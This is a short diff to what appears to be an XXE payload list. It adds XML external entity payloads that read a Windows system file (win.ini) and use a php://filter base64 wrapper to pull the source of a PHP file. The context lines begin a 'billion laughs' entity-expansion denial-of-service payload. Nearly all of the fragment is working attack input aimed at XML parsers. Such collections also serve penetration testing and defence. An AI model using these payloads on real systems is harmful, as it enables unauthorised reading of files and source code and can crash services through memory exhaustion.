@@ -31,6 +31,12 @@
 ```
 
 ```
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///c:/windows/win.ini"> ]>
+
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=file:///var/www/html/xxe/aaa.php">]>
+```
+
+```
 <!--?xml version="1.0" ?-->
 <!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
